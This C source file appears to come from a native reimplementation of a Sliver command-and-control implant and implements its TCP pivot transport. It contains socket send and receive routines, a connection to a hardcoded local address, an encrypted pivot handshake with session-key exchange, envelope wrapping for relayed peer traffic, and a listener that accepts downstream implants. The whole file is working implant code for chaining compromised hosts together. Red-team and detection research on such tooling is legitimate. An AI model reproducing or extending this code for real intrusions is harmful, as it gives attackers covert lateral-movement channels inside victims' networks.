#include "pch.h"

BOOL SocketSend
(
	_In_ PSLIVER_TCP_CLIENT pSliverTcpClient,
	_In_ PBUFFER pBuffer
)
{
	BOOL Result = FALSE;
	DWORD dwNumberOfBytesSent = 0;
	DWORD dwTotal = 0;
	DWORD dwZeroTimeout = 0;
	PBYTE pTemp = NULL;
	DWORD cbTemp = 0;

	cbTemp = sizeof(DWORD) + pBuffer->cbBuffer;
	pTemp = ALLOC(cbTemp);
	memcpy(pTemp, &pBuffer->cbBuffer, sizeof(DWORD));
	memcpy(pTemp + sizeof(DWORD), pBuffer->pBuffer, pBuffer->cbBuffer);
	EnterCriticalSection(pSliverTcpClient->pWriteLock);
	/*if (setsockopt(pSliverTcpClient->Sock, SOL_SOCKET, SO_SNDTIMEO, &pSliverTcpClient->dwWriteDeadline, sizeof(pSliverTcpClient->dwWriteDeadline))) {
		LOG_ERROR("setsockopt", WSAGetLastError());
		goto CLEANUP;
	}*/

	while (dwTotal < cbTemp) {
		dwNumberOfBytesSent = send(pSliverTcpClient->Sock, &pTemp[dwTotal], cbTemp - dwTotal, 0);
		if (dwNumberOfBytesSent == SOCKET_ERROR) {
			LOG_ERROR("send", WSAGetLastError());
			goto CLEANUP;
		}

		dwTotal += dwNumberOfBytesSent;
	}

	Result = TRUE;
CLEANUP:
	/*if (setsockopt(pSliverTcpClient->Sock, SOL_SOCKET, SO_SNDTIMEO, &dwZeroTimeout, sizeof(dwZeroTimeout))) {
		LOG_ERROR("setsockopt", WSAGetLastError());
	}*/

	LeaveCriticalSection(pSliverTcpClient->pWriteLock);
	FREE(pTemp);

	return Result;
}

PBUFFER SocketRecv
(
	_In_ PSLIVER_TCP_CLIENT pSliverTcpClient
)
{
	PBUFFER Result = NULL;
	DWORD dwNumberOfBytesRecv = 0;
	DWORD dwTotal = 0;
	DWORD dwZeroTimeout = 0;
	BOOL IsOk = FALSE;

	EnterCriticalSection(pSliverTcpClient->pReadLock);
	/*if (setsockopt(pSliverTcpClient->Sock, SOL_SOCKET, SO_RCVTIMEO, &pSliverTcpClient->dwReadDeadline, sizeof(pSliverTcpClient->dwReadDeadline))) {
		LOG_ERROR("setsockopt", WSAGetLastError());
		goto CLEANUP;
	}*/

	Result = ALLOC(sizeof(BUFFER));
	dwNumberOfBytesRecv = recv(pSliverTcpClient->Sock, &Result->cbBuffer, sizeof(Result->cbBuffer), 0);
	if (dwNumberOfBytesRecv == SOCKET_ERROR || dwNumberOfBytesRecv != sizeof(Result->cbBuffer)) {
		LOG_ERROR("recv", WSAGetLastError());
		goto CLEANUP;
	}

	Result->pBuffer = ALLOC(Result->cbBuffer);
	while (dwTotal < Result->cbBuffer) {
		dwNumberOfBytesRecv = recv(pSliverTcpClient->Sock, &Result->pBuffer[dwTotal], Result->cbBuffer - dwTotal, 0);
		if (dwNumberOfBytesRecv == SOCKET_ERROR) {
			LOG_ERROR("recv", WSAGetLastError());
			goto CLEANUP;
		}

		dwTotal += dwNumberOfBytesRecv;
	}

	IsOk = TRUE;
CLEANUP:
	/*if (setsockopt(pSliverTcpClient->Sock, SOL_SOCKET, SO_RCVTIMEO, &dwZeroTimeout, sizeof(dwZeroTimeout))) {
		LOG_ERROR("setsockopt", WSAGetLastError());
	}*/

	LeaveCriticalSection(pSliverTcpClient->pReadLock);
	if (!IsOk) {
		FreeBuffer(Result);
		Result = NULL;
	}

	return Result;
}

PSLIVER_TCP_CLIENT TcpInit()
{
	PSLIVER_TCP_CLIENT pResult = NULL;
	CHAR szBindAddress[] = "127.0.0.1:9898";
	DWORD dwReadDeadline = 10;
	DWORD dwWriteDeadline = 10;
	WSADATA WsaData;
	int ErrorCode = 0;
	BOOL Result = FALSE;
	BOOL IsOk = FALSE;
	ULONG uBlockingMode = 0;

	pResult = ALLOC(sizeof(SLIVER_TCP_CLIENT));
	pResult->lpBindAddress = DuplicateStrA(szBindAddress, 0);
	pResult->dwReadDeadline = dwReadDeadline * 1000;
	pResult->dwWriteDeadline = dwWriteDeadline * 1000;
	pResult->Sock = INVALID_SOCKET;

	SecureZeroMemory(&WsaData, sizeof(WsaData));
	if (WSAStartup(MAKEWORD(2, 2), &WsaData) != 0) {
		LOG_ERROR("WSAStartup", WSAGetLastError());
		goto CLEANUP;
	}

	pResult->Sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
	if (pResult->Sock == INVALID_SOCKET) {
		LOG_ERROR("socket", WSAGetLastError());
		goto CLEANUP;
	}

	if (ioctlsocket(pResult->Sock, FIONBIO, &uBlockingMode)) {
		LOG_ERROR("ioctlsocket", WSAGetLastError());
		goto CLEANUP;
	}

	pResult->pReadLock = ALLOC(sizeof(CRITICAL_SECTION));
	pResult->pWriteLock = ALLOC(sizeof(CRITICAL_SECTION));
	InitializeCriticalSection(pResult->pReadLock);
	InitializeCriticalSection(pResult->pWriteLock);
	IsOk = TRUE;
CLEANUP:
	if (!IsOk) {
		TcpCleanup(pResult);
		pResult = NULL;
	}

	return pResult;
}

BOOL TcpClose
(
	_In_ PSLIVER_TCP_CLIENT pSliverTcpClient
)
{
	if (pSliverTcpClient != NULL) {
		if (pSliverTcpClient->Sock != INVALID_SOCKET) {
			closesocket(pSliverTcpClient->Sock);
		}
	}

	return TRUE;
}

BOOL TcpCleanup
(
	_In_ PSLIVER_TCP_CLIENT pSliverTcpClient
)
{
	if (pSliverTcpClient != NULL) {
		FREE(pSliverTcpClient->lpBindAddress);
		if (pSliverTcpClient->pReadLock != NULL) {
			DeleteCriticalSection(pSliverTcpClient->pReadLock);
			FREE(pSliverTcpClient->pReadLock);
		}

		if (pSliverTcpClient->pWriteLock != NULL) {
			DeleteCriticalSection(pSliverTcpClient->pWriteLock);
			FREE(pSliverTcpClient->pWriteLock);
		}

		FREE(pSliverTcpClient);
		WSACleanup();
	}

	return TRUE;
}

BOOL TcpStart
(
	_In_ PGLOBAL_CONFIG pConfig,
	_In_ PSLIVER_TCP_CLIENT pSliverTcpClient
)
{
	BOOL Result = FALSE;
	DWORD dwErrorCode = SOCKET_ERROR;
	PBUFFER pPivotHello = NULL;
	PBUFFER pPeerPublicKeyRaw = NULL;
	PPIVOT_HELLO RecvPivotHello = NULL;
	PBUFFER pPeerSessionKey = NULL;
	PBYTE pEncryptedSessionKey = NULL;
	DWORD cbEncryptedSessionKey = 0;
	PPBElement PivotServerKeyExchange[2];
	PPBElement pPivotServerKeyExchangeData = NULL;
	PPIVOT_PEER_ENVELOPE pPivotPeerEnvelope = NULL;
	PENVELOPE pEnvelope = NULL;
	PBUFFER pPivotServerKeyExchangeEnvelope = NULL;
	PBUFFER pCipherText = NULL;
	PENVELOPE pRecvEnvelope = NULL;
	PPBElement ServerKeyExResp[2];
	LPVOID* UnmarshaledData = NULL;
	DWORD i = 0;
	IN_ADDR InAddr;
	IN6_ADDR In6Addr;
	SOCKADDR_IN SockAddr;
	SOCKADDR_IN6 SockAddr6;
	ULONG uScopeId = 0;
	NTSTATUS Status = STATUS_SUCCESS;
	USHORT uPort = 0;
	BOOL UseIpv4 = TRUE;
	DWORD dwReturnedCode = NO_ERROR;

	SecureZeroMemory(PivotServerKeyExchange, sizeof(PivotServerKeyExchange));
	SecureZeroMemory(ServerKeyExResp, sizeof(ServerKeyExResp));
	SecureZeroMemory(&InAddr, sizeof(InAddr));
	SecureZeroMemory(&In6Addr, sizeof(In6Addr));
	SecureZeroMemory(&SockAddr, sizeof(SockAddr));
	SecureZeroMemory(&SockAddr6, sizeof(SockAddr6));
	Status = RtlIpv6StringToAddressExA(pSliverTcpClient->lpBindAddress, &In6Addr, &uScopeId, &uPort);
	if (Status == STATUS_SUCCESS) {
		memcpy(&SockAddr6.sin6_addr, &In6Addr, sizeof(In6Addr));
		SockAddr6.sin6_port = uPort;
		SockAddr6.sin6_family = AF_INET6;
		SockAddr6.sin6_scope_id = uScopeId;
		UseIpv4 = FALSE;
	}
	else {
		Status = RtlIpv4StringToAddressExA(pSliverTcpClient->lpBindAddress, TRUE, &InAddr, &uPort);
		if (Status == STATUS_SUCCESS) {
			SockAddr.sin_addr.s_addr = InAddr.S_un.S_addr;
			SockAddr.sin_port = uPort;
			SockAddr.sin_family = AF_INET;
		}
		else {
			LOG_ERROR("RtlIpv6StringToAddressExA", Status);
			goto CLEANUP;
		}
	}

	if (UseIpv4) {
		dwReturnedCode = connect(pSliverTcpClient->Sock, &SockAddr, sizeof(SockAddr));
	}
	else {
		dwReturnedCode = connect(pSliverTcpClient->Sock, &SockAddr6, sizeof(SockAddr6));
	}

	if (dwReturnedCode != NO_ERROR) {
		LOG_ERROR("connect", WSAGetLastError());
		goto CLEANUP;
	}

	pPivotHello = MarshalPivotHello(pConfig, NULL);
	if (!SocketSend(pSliverTcpClient, pPivotHello)) {
		goto CLEANUP;
	}

	pPeerPublicKeyRaw = SocketRecv(pSliverTcpClient);
	if (pPeerPublicKeyRaw == NULL) {
		goto CLEANUP;
	}

	RecvPivotHello = UnmarshalPivotHello(pPeerPublicKeyRaw);
	pPeerSessionKey = AgeDecryptFromPeer(pConfig, RecvPivotHello->pPublicKey, RecvPivotHello->lpPublicKeySignature, RecvPivotHello->pSessionKey);
	if (pPeerSessionKey == NULL || pPeerSessionKey->cbBuffer != CHACHA20_KEY_SIZE) {
		goto CLEANUP;
	}

	pConfig->pPeerSessionKey = pPeerSessionKey->pBuffer;
	pPeerSessionKey->pBuffer = NULL;

	// Server Key Exchange
	pConfig->pSessionKey = GenRandomBytes(CHACHA20_KEY_SIZE);
	pEncryptedSessionKey = AgeKeyExToServer(pConfig->lpRecipientPubKey, pConfig->lpPeerPrivKey, pConfig->lpPeerPubKey, pConfig->pSessionKey, CHACHA20_KEY_SIZE, &cbEncryptedSessionKey);
	PivotServerKeyExchange[0] = CreateVarIntElement(pConfig->uPeerID, 1);
	PivotServerKeyExchange[1] = CreateBytesElement(pEncryptedSessionKey, cbEncryptedSessionKey, 2);
	pPivotServerKeyExchangeData = CreateStructElement(PivotServerKeyExchange, _countof(PivotServerKeyExchange), 0);

	pPivotPeerEnvelope = ALLOC(sizeof(PIVOT_PEER_ENVELOPE));
	pPivotPeerEnvelope->cPivotPeers = 1;
	pPivotPeerEnvelope->PivotPeers = ALLOC(sizeof(PPIVOT_PEER) * pPivotPeerEnvelope->cPivotPeers);
	pPivotPeerEnvelope->PivotPeers[0] = ALLOC(sizeof(PIVOT_PEER));
	pPivotPeerEnvelope->PivotPeers[0]->uPeerID = pConfig->uPeerID;
	pPivotPeerEnvelope->PivotPeers[0]->lpName = DuplicateStrA(pConfig->szSliverName, 0);

	pPivotPeerEnvelope->uType = MsgPivotServerKeyExchange;
	pPivotPeerEnvelope->pData = BufferMove(pPivotServerKeyExchangeData->pMarshaledData, pPivotServerKeyExchangeData->cbMarshaledData);
	pPivotServerKeyExchangeData->pMarshaledData = NULL;

	pEnvelope = ALLOC(sizeof(ENVELOPE));
	pEnvelope->uType = MsgPivotPeerEnvelope;
	pEnvelope->pData = MarshalPivotPeerEnvelope(pPivotPeerEnvelope);
	pPivotServerKeyExchangeEnvelope = MarshalEnvelope(pEnvelope);

	pCipherText = SliverEncrypt(pConfig->pPeerSessionKey, pPivotServerKeyExchangeEnvelope);
	if (!SocketSend(pSliverTcpClient, pCipherText)) {
		goto CLEANUP;
	}

	pRecvEnvelope = TcpRecv(pConfig, pSliverTcpClient);
	if (pRecvEnvelope == NULL || pRecvEnvelope->uType != MsgPivotServerKeyExchange) {
		goto CLEANUP;
	}

	ServerKeyExResp[0] = ALLOC(sizeof(PBElement));
	ServerKeyExResp[0]->dwFieldIdx = 1;
	ServerKeyExResp[0]->Type = Varint;

	ServerKeyExResp[1] = ALLOC(sizeof(PBElement));
	ServerKeyExResp[1]->dwFieldIdx = 2;
	ServerKeyExResp[1]->Type = Bytes;

	UnmarshaledData = UnmarshalStruct(ServerKeyExResp, _countof(ServerKeyExResp), pRecvEnvelope->pData->pBuffer, pRecvEnvelope->pData->cbBuffer, NULL);
	if (UnmarshaledData == NULL || UnmarshaledData[1] == NULL) {
		goto CLEANUP;
	}

	memcpy(pConfig->PivotSessionID, ((PBUFFER)UnmarshaledData[1])->pBuffer, sizeof(pConfig->PivotSessionID));
	Result = TRUE;
CLEANUP:
	FreeBuffer(pPivotHello);
	FreeBuffer(pPeerSessionKey);
	FreeBuffer(pPeerPublicKeyRaw);
	FreePivotHello(RecvPivotHello);
	FreeElement(pPivotServerKeyExchangeData);
	FreeEnvelope(pEnvelope);
	FreeBuffer(pPivotServerKeyExchangeEnvelope);
	FreeBuffer(pCipherText);
	FreePivotPeerEnvelope(pPivotPeerEnvelope);
	FreeEnvelope(pRecvEnvelope);
	FREE(pEncryptedSessionKey);
	for (i = 0; i < _countof(ServerKeyExResp); i++) {
		FREE(ServerKeyExResp[i]);
	}

	if (UnmarshaledData != NULL) {
		FreeBuffer((PBUFFER)UnmarshaledData[1]);
		FREE(UnmarshaledData);
	}
	

	return Result;
}

PENVELOPE TcpRecv
(
	_In_ PGLOBAL_CONFIG pConfig,
	_In_ PSLIVER_TCP_CLIENT pTcpClient
)
{
	PENVELOPE pResult = NULL;
	PBUFFER pCipherText = NULL;
	PBUFFER pData = NULL;
	PBUFFER pPlainText = NULL;
	PENVELOPE pIncomingEnvelope = NULL;
	PPIVOT_PEER_ENVELOPE pPivotPeerEnvelope = NULL;

	pCipherText = SocketRecv(pTcpClient);
	if (pCipherText == NULL) {
		goto CLEANUP;
	}

	pData = SliverDecrypt(pConfig->pPeerSessionKey, pCipherText);
	if (pData == NULL) {
		goto CLEANUP;
	}

	pIncomingEnvelope = UnmarshalEnvelope(pData);
	if (pIncomingEnvelope->uType == MsgPivotPeerPing) {
		pResult = pIncomingEnvelope;
		pIncomingEnvelope = NULL;
		goto CLEANUP;
	}

	if (pIncomingEnvelope->uType != MsgPivotPeerEnvelope) {
		goto CLEANUP;
	}

	pPivotPeerEnvelope = UnmarshalPivotPeerEnvelope(pIncomingEnvelope->pData);
	if (pPivotPeerEnvelope == NULL) {
		goto CLEANUP;
	}

	if (pPivotPeerEnvelope->cPivotPeers < 1) {
		goto CLEANUP;
	}

	if (pPivotPeerEnvelope->PivotPeers[0]->uPeerID != pConfig->uPeerID) {
		pResult = pIncomingEnvelope;
		pIncomingEnvelope = NULL;
		goto CLEANUP;
	}

	pPlainText = SliverDecrypt(pConfig->pSessionKey, pPivotPeerEnvelope->pData);
	if (pPlainText == NULL) {
		goto CLEANUP;
	}

	pResult = UnmarshalEnvelope(pPlainText);
	PrintFormatA("Read Envelope:\n");
	HexDump(pResult->pData->pBuffer, pResult->pData->cbBuffer);
CLEANUP:
	FreeBuffer(pCipherText);
	FreeBuffer(pData);
	FreeBuffer(pPlainText);
	FreeEnvelope(pIncomingEnvelope);
	FreePivotPeerEnvelope(pPivotPeerEnvelope);

	return pResult;
}

BOOL TcpSend
(
	_In_ PGLOBAL_CONFIG pConfig,
	_In_ PSLIVER_TCP_CLIENT pTcpClient,
	_In_ PENVELOPE pEnvelope
)
{
	PBUFFER pPlainText = NULL;
	BOOL Result = FALSE;
	PBUFFER pPeerPlainText = NULL;
	PBUFFER pPeerCiphertext = NULL;
	PBUFFER pCipherText = NULL;
	PPIVOT_PEER_ENVELOPE pPivotPeerEnvelope = NULL;
	ENVELOPE FinalEnvelope;

	if (pEnvelope == NULL) {
		goto CLEANUP;
	}

	if (pEnvelope->pData != NULL) {
		PrintFormatA("Write Envelope:\n");
		if (pEnvelope->pData->cbBuffer > 0x1000) {
			HexDump(pEnvelope->pData->pBuffer, 0x1000);
		}
		else {
			HexDump(pEnvelope->pData->pBuffer, pEnvelope->pData->cbBuffer);
		}
	}
	else {
		PrintFormatW(L"Write Envelope: []\n");
	}

	pPlainText = MarshalEnvelope(pEnvelope);
	if (pEnvelope->uType != MsgPivotPeerPing && pEnvelope->uType != MsgPivotPeerEnvelope) {
		pPivotPeerEnvelope = ALLOC(sizeof(PIVOT_PEER_ENVELOPE));
		pPivotPeerEnvelope->uType = MsgPivotSessionEnvelope;
		pPivotPeerEnvelope->pPivotSessionID = BufferInit(pConfig->PivotSessionID, sizeof(pConfig->PivotSessionID));
		pPivotPeerEnvelope->pData = SliverEncrypt(pConfig->pSessionKey, pPlainText);
		pPivotPeerEnvelope->cPivotPeers = 1;
		pPivotPeerEnvelope->PivotPeers = ALLOC(sizeof(PPIVOT_PEER) * pPivotPeerEnvelope->cPivotPeers);
		pPivotPeerEnvelope->PivotPeers[0] = ALLOC(sizeof(PIVOT_PEER));
		pPivotPeerEnvelope->PivotPeers[0]->uPeerID = pConfig->uPeerID;
		pPivotPeerEnvelope->PivotPeers[0]->lpName = DuplicateStrA(pConfig->szSliverName, 0);

		SecureZeroMemory(&FinalEnvelope, sizeof(FinalEnvelope));
		FinalEnvelope.uType = MsgPivotPeerEnvelope;
		FinalEnvelope.pData = MarshalPivotPeerEnvelope(pPivotPeerEnvelope);
		pPeerPlainText = MarshalEnvelope(&FinalEnvelope);
		FreeBuffer(FinalEnvelope.pData);


	}
	else {
		pPeerPlainText = pPlainText;
		pPlainText = NULL;
	}

	pPeerCiphertext = SliverEncrypt(pConfig->pPeerSessionKey, pPeerPlainText);
	if (!SocketSend(pTcpClient, pPeerCiphertext)) {
		goto CLEANUP;
	}

	Result = TRUE;
CLEANUP:
	FreeBuffer(pPlainText);
	FreeBuffer(pPeerPlainText);
	FreeBuffer(pPeerCiphertext);
	FreePivotPeerEnvelope(pPivotPeerEnvelope);

	return Result;
}

PPIVOT_CONNECTION TcpAccept
(
	_In_ PPIVOT_LISTENER pListener
)
{
	SOCKET Sock = INVALID_SOCKET;
	SOCKET NewSock = INVALID_SOCKET;
	PPIVOT_CONNECTION pResult = NULL;
	PSLIVER_TCP_CLIENT pTcpClient = NULL;
	ULONG uBlockingMode = 0;
	SOCKADDR PeerAddr;
	DWORD dwNameLength = sizeof(PeerAddr);

	Sock = (SOCKET)pListener->ListenHandle;
	NewSock = accept(Sock, NULL, NULL);
	if (NewSock == INVALID_SOCKET) {
		LOG_ERROR("accept", WSAGetLastError());
		goto CLEANUP;
	}

	if (ioctlsocket(NewSock, FIONBIO, &uBlockingMode)) {
		LOG_ERROR("ioctlsocket", WSAGetLastError());
		goto CLEANUP;
	}
	
	pResult = ALLOC(sizeof(PIVOT_CONNECTION));
	/*pResult = ALLOC(sizeof(SLIVER_TCP_CLIENT));
	pResult->lpHost = DuplicateStrA(szHost, 0);
	pResult->dwReadDeadline = dwReadDeadline * 1000;
	pResult->dwWriteDeadline = dwWriteDeadline * 1000;
	pResult->Sock = INVALID_SOCKET;
	pResult->dwPort = dwPort;*/
	pTcpClient = ALLOC(sizeof(SLIVER_TCP_CLIENT));
	pTcpClient->dwReadDeadline = 10 * 1000;
	pTcpClient->dwWriteDeadline = 10 * 1000;
	pTcpClient->Sock = NewSock;
	pTcpClient->pReadLock = ALLOC(sizeof(CRITICAL_SECTION));
	pTcpClient->pWriteLock = ALLOC(sizeof(CRITICAL_SECTION));
	InitializeCriticalSection(pTcpClient->pReadLock);
	InitializeCriticalSection(pTcpClient->pWriteLock);
	SecureZeroMemory(&PeerAddr, sizeof(PeerAddr));
	if (getpeername(NewSock, &PeerAddr, &dwNameLength) == NO_ERROR) {
		pResult->lpRemoteAddress = SocketAddressToStr(&PeerAddr);
	}

	pResult->lpDownstreamConn = pTcpClient;
	pResult->pListener = pListener;
CLEANUP:
	return pResult;
}

PPIVOT_LISTENER CreateTCPPivotListener
(
	_In_ PGLOBAL_CONFIG pConfig,
	_In_ LPVOID lpClient,
	_In_ LPSTR lpBindAddress
)
{
	PPIVOT_LISTENER pListener = NULL;
	IN_ADDR InAddr;
	IN6_ADDR In6Addr;
	BOOL UseIpv4 = TRUE;
	NTSTATUS Status = STATUS_SUCCESS;
	SOCKADDR_IN SockAddr;
	SOCKADDR_IN6_LH SockAddr6;
	ULONG uScopeId = 0;
	USHORT uPort = 0;
	SOCKET Sock = INVALID_SOCKET;
	DWORD dwErrorCode = 0;
	BOOL IsOk = FALSE;
	WSADATA WsaData;
	ULONG uBlockingMode = 0;

	SecureZeroMemory(&WsaData, sizeof(WsaData));
	if (WSAStartup(MAKEWORD(2, 2), &WsaData) != 0) {
		goto CLEANUP;
	}

	SecureZeroMemory(&InAddr, sizeof(InAddr));
	SecureZeroMemory(&In6Addr, sizeof(In6Addr));
	SecureZeroMemory(&SockAddr, sizeof(SockAddr));
	SecureZeroMemory(&SockAddr6, sizeof(SockAddr6));
	Status = RtlIpv6StringToAddressExA(lpBindAddress, &In6Addr, &uScopeId, &uPort);
	if (Status == STATUS_SUCCESS) {
		memcpy(&SockAddr6.sin6_addr, &In6Addr, sizeof(In6Addr));
		SockAddr6.sin6_port = uPort;
		SockAddr6.sin6_family = AF_INET6;
		SockAddr6.sin6_scope_id = uScopeId;
		UseIpv4 = FALSE;
	}
	else {
		Status = RtlIpv4StringToAddressExA(lpBindAddress, TRUE, &InAddr, &uPort);
		if (Status == STATUS_SUCCESS) {
			SockAddr.sin_addr.s_addr = InAddr.S_un.S_addr;
			SockAddr.sin_port = uPort;
			SockAddr.sin_family = AF_INET;
		}
		else {
			LOG_ERROR("RtlIpv6StringToAddressExA", Status);
			goto CLEANUP;
		}
	}

	if (UseIpv4) {
		Sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
	}
	else {
		Sock = socket(AF_INET6, SOCK_STREAM, IPPROTO_TCP);
	}

	if (Sock == INVALID_SOCKET) {
		LOG_ERROR("socket", WSAGetLastError());
		goto CLEANUP;
	}

	if (ioctlsocket(Sock, FIONBIO, &uBlockingMode)) {
		LOG_ERROR("ioctlsocket", WSAGetLastError());
		goto CLEANUP;
	}

	if (UseIpv4) {
		dwErrorCode = bind(Sock, &SockAddr, sizeof(SockAddr));
	}
	else {
		dwErrorCode = bind(Sock, &SockAddr6, sizeof(SockAddr6));
	}

	if (dwErrorCode != NO_ERROR) {
		LOG_ERROR("bind", WSAGetLastError());
		goto CLEANUP;
	}

	if (listen(Sock, SOMAXCONN) != NO_ERROR) {
		LOG_ERROR("listen", WSAGetLastError());
		goto CLEANUP;
	}

	IsOk = TRUE;
	pListener = ALLOC(sizeof(PIVOT_LISTENER));
	pListener->ListenHandle = Sock;
	pListener->lpBindAddress = DuplicateStrA(lpBindAddress, 0);
	pListener->dwType = PivotType_TCP;
	pListener->dwListenerId = pConfig->dwListenerID++;
	pListener->pConfig = pConfig;
	pListener->lpUpstream = lpClient;
	InitializeCriticalSection(&pListener->Lock);

	pListener->RawSend = SocketSend;
	pListener->RawRecv = SocketRecv;
	pListener->Accept = TcpAccept;
	pListener->Close = TcpClose;
	pListener->Cleanup = TcpCleanup;
	pListener->hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)ListenerMainLoop, (LPVOID)pListener, 0, NULL);
	if (pListener->hThread == NULL) {
		LOG_ERROR("CreateThread", GetLastError());
		goto CLEANUP;
	}

CLEANUP:
	if (!IsOk && Sock != 0) {
		closesocket(Sock);
		WSACleanup();
	}

	return pListener;
}